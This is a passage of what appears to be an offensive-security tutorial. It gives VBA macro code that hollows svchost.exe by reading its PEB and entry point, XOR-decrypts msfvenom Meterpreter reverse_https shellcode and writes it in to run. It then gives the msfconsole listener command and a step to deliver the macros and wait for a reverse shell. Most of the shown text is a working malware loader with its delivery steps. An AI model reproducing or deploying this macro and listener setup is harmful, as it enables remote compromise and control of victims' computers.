#Else
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 8
    Dim AddrBuf(3) As Byte
#End if

    Dim tmp As Long
    tmp = 0
#If Win64 Then
    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
    svcHostBase = AddrBuf(7) * (2 ^ 56)
    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#Else
    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
    svcHostBase = AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#End if

    Dim data(512) As Byte
    ' Read more data from PEB so e_lfanew offset can be retrieved
    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)

    ' Read e_lfanew offset value and add 40
    Dim e_lfanew_offset As Long
    e_lfanew_offset = data(60)

    Dim opthdr As Long
    opthdr = e_lfanew_offset + 40

    ' Construct relative virtual address for svchost's entry point
    Dim entrypoint_rva As Long
    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
    entrypoint_rva = entrypoint_rva + data(opthdr)

    Dim addressOfEntryPoint As LongPtr
    ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
    addressOfEntryPoint = entrypoint_rva + svcHostBase

    ' Buffer for malicious crypted shellcode needs to go here
    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "CHANGEMYKEY"

' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'
sc = Array(145,145,252,...,180)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key

    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x

    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

    ' Write the shellcode into the svchost.exe entry point
    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
    ' Resume svchost.exe process to run the shellcode
    b = ResumeThread(pi.hThread)

End Function

```

1. **Start your Metasploit listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Deliver your Macros** and wait for execution and your reverse shell
